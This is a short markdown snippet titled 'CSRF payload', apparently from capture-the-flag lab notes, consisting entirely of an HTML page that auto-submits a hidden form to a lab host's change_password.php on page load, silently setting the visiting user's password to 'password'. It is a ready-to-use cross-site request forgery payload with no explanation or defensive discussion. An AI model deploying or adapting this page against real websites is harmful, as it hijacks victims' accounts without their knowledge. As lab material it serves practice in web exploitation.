# CSRF payload

---

## change_pass



```html
<!DOCTYPE html>
<html>
<head>
	<title>CSRF</title>
</head>
    <body>
    <form id="autosubmit" action="http://login.worldwap.thm/change_password.php" enctype="application/x-www-form-urlencoded" method="POST">
    <input name="new_password" type="hidden" value="password" />
    </form>
    <script>
        document.getElementById("autosubmit").submit();
    </script>
    </body>
</html>
```